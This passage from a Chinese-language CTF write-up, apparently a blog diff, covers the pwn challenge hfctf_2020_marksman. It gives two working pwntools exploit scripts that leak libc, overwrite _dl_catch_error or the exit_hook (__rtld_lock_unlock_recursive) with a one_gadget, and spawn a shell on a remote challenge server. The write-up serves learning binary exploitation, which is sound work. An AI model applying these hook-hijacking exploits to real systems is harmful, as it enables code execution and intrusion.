class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(_dl_catch_error_libc)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shoot!shoot!\n&#x27;</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这个方法的条件苛刻（主要是“one_gadget”），而且找偏移不好找</p>
+<p>网上有另一种劫持技术：<strong>exit_hook</strong></p>
+<hr>
+<p><strong>攻击技术：exit_hook</strong></p>
+<p>exit的调用过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>() -&gt; __run_exit_handlers -&gt; _dl_fini -&gt; __rtld_lock_unlock_recursive</span><br></pre></td></tr></table></figure>
+<p>其中的 “__rtld_lock_unlock_recursive” 是可以被劫持的，它的偏移也可以在GDB中计算</p>
+<p>​        // 注意：利用“exit_hook”进行攻击，“one_gadget”有所改变</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;117.21.200.166&#x27;</span>,<span class="number">26233</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./hfctf_2020_marksman&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./hfctf_2020_marksman&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;I placed the target near: &#x27;</span>)</span><br><span class="line">puts_libc=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&#x27;puts_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_libc)</span><br><span class="line">libc_base=puts_libc-obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">__rtld_lock_unlock_recursive=libc_base + <span class="number">0x81df60</span></span><br><span class="line">one_gadget=libc_base + <span class="number">0x10a387</span></span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;__rtld_lock_unlock_recursive &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(__rtld_lock_unlock_recursive))</span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(__rtld_lock_unlock_recursive)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shoot!shoot!\n&#x27;</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>大体的步骤都是差不多的，就是劫持的地址不一样</p>
+<hr>
+<p><strong>PS</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>(__rtld_lock_unlock_recursive)</span><br><span class="line">p64(__rtld_lock_unlock_recursive)</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>)</span><br><span class="line">p64(one_gadget &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>
+<p>exp选择用 “str&amp;chr” 而不是 “p64”</p>
+<p>经过实验发现，只有使用 “str&amp;chr” 才不会报错，“str，p64，chr”三者的其他任意组合都不能打通，并且会进行报错：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout: the monitored command dumped core</span><br></pre></td></tr></table></figure>
+<p>目前不知道原因，只有先记住：被修改的对象用“str”，修改的内容用“chr”</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/hook/" rel="tag"><i class="fa fa-tag"></i> hook</a>
+              <a href="/tags/dlopen/" rel="tag"><i class="fa fa-tag"></i> dlopen</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/18/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUnlink%E6%94%BB%E5%87%BB/" rel="prev" title="Ptmalloc算法：Unlink攻击">
+      <i class="fa fa-chevron-left"></i> Ptmalloc算法：Unlink攻击
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/" rel="next" title="Ptmalloc算法：Double Free">
+      Ptmalloc算法：Double Free <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
